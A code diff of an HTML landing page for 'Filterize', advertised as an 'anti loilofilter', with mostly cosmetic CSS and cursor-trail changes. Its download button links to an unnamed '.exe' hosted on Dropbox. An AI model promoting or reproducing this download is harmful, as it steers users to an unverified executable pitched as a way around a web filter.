@@ -11,7 +11,7 @@
             width: 100%;
             height: 100%;
             overflow: hidden;
-            background-color: #000; /* 画像が読み込まれるまでの背景色 */
+            background-color: #111; /* 画像が出ない時の予備色 */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -19,40 +19,39 @@
             font-family: 'Segoe UI', sans-serif;
         }
 
-        /* 背景画像：画面全体に広げてぼかす */
+        /* 背景：画像指定の場所 */
         .bg-container {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
-            z-index: -2; /* コンテンツと残像の後ろに配置 */
+            z-index: -2;
             overflow: hidden;
         }
 
         .bg-image {
-            width: 120%; /* ぼかしの端を隠すために少し大きく */
-            height: 120%;
+            width: 110%;
+            height: 110%;
             position: absolute;
-            top: -10%;
-            left: -10%;
-            background: url('背景.png') no-repeat center center;
+            top: -5%;
+            left: -5%;
+            /* ↓ ここが画像指定！ファイル名がズレていると出ません */
+            background-image: url('./背景.png'); 
+            background-repeat: no-repeat;
+            background-position: center;
             background-size: cover;
-            filter: blur(20px) brightness(0.5); /* ぼかしと明るさの調整 */
+            filter: blur(20px) brightness(0.5);
         }
 
-        /* 中央のコンテンツ */
         .content {
             text-align: center;
             z-index: 10;
-            pointer-events: none; /* マウスイベントを透過させて残像に干渉させない */
         }
 
         h1 {
             font-size: clamp(3rem, 15vw, 6rem);
             margin: 0;
-            font-weight: 800;
-            /* ピンクのグラデーション文字 */
             background: linear-gradient(to bottom, #ffd1ff, #fbc2eb);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -60,12 +59,10 @@
 
         .subtitle {
             font-size: 1.2rem;
-            color: rgba(255, 255, 255, 0.8);
+            color: rgba(255,255,255,0.7);
             margin: 10px 0 40px 0;
-            font-weight: 300;
         }
 
-        /* ダウンロードボタン（画像通りのスタイル） */
         .btn {
             display: inline-block;
             padding: 18px 60px;
@@ -73,39 +70,22 @@
             text-decoration: none;
             color: white;
             font-weight: bold;
-            font-size: 1.2rem;
-            /* ピンク〜紫のグラデーション */
             background: linear-gradient(135deg, #cf9fff 0%, #ff99cc 100%);
             box-shadow: 0 10px 30px rgba(207, 159, 255, 0.4);
-            pointer-events: auto; /* ボタンだけはクリック可能にする */
             transition: 0.3s;
         }
 
-        .btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 40px rgba(255, 153, 204, 0.6);
-            filter: brightness(1.1);
-        }
-
-        /* 残像（トレイル）の要素 */
+        /* 残像（ドット）のデザイン */
         .trail {
             position: fixed;
-            width: 15px;
-            height: 15px;
+            width: 8px;
+            height: 8px;
+            background: #ff99cc; /* ピンクの残像 */
             border-radius: 50%;
-            background-color: rgba(255, 255, 255, 0.5);
-            pointer-events: none; /* マウスイベントを透過させる */
-            z-index: -1; /* 背景の前、コンテンツの後ろに配置 */
-            transform: translate(-50%, -50%);
-            transition: width 0.3s ease-out, height 0.3s ease-out, opacity 0.3s ease-out; /* 残像が消える際のアニメーション */
+            pointer-events: none;
+            z-index: 5;
+            transition: transform 0.1s linear, opacity 0.5s ease-out;
         }
-
-        .trail.inactive {
-            width: 0px;
-            height: 0px;
-            opacity: 0;
-        }
-
     </style>
 </head>
 <body>
@@ -117,41 +97,27 @@
     <div class="content">
         <h1>Filterize</h1>
         <p class="subtitle">The best anti loilofilter</p>
-        
         <a href="https://www.dropbox.com/scl/fi/jhjaiww74lcgo741zqnng/.exe?rlkey=tv4zztnvfql4sd4c4nfsncioz&st=vwymdduv&dl=1" class="btn">
             Download Now
         </a>
     </div>
 
     <script>
-        const trailCount = 30; // 残像の数
-        const trails = [];
-
-        // 残像要素の生成
-        for (let i = 0; i < trailCount; i++) {
-            const trail = document.createElement('div');
-            trail.classList.add('trail', 'inactive');
-            document.body.appendChild(trail);
-            trails.push(trail);
-        }
-
-        // カーソル移動に合わせて残像を動かす
+        // 残像の処理
         document.addEventListener('mousemove', (e) => {
-            // 最も古い残像を取得して、新しい位置に配置
-            const oldestTrail = trails.shift();
-            oldestTrail.style.left = `${e.clientX}px`;
-            oldestTrail.style.top = `${e.clientY}px`;
-            oldestTrail.classList.remove('inactive'); // 活性化
-            
-            // 残像を最後尾に移動（次に取得するときに最も古い残像になる）
-            trails.push(oldestTrail);
+            const trail = document.createElement('div');
+            trail.className = 'trail';
+            trail.style.left = e.pageX + 'px';
+            trail.style.top = e.pageY + 'px';
+            document.body.appendChild(trail);
 
-            // 一定時間後に非活性化（消えるアニメーション）
+            // 0.5秒かけて消えていく
             setTimeout(() => {
-                oldestTrail.classList.add('inactive');
-            }, 300); // 消えるまでの時間（ミリ秒）
+                trail.style.opacity = '0';
+                trail.style.transform = 'scale(0)';
+                setTimeout(() => trail.remove(), 500);
+            }, 50);
         });
     </script>
-
 </body>
 </html>
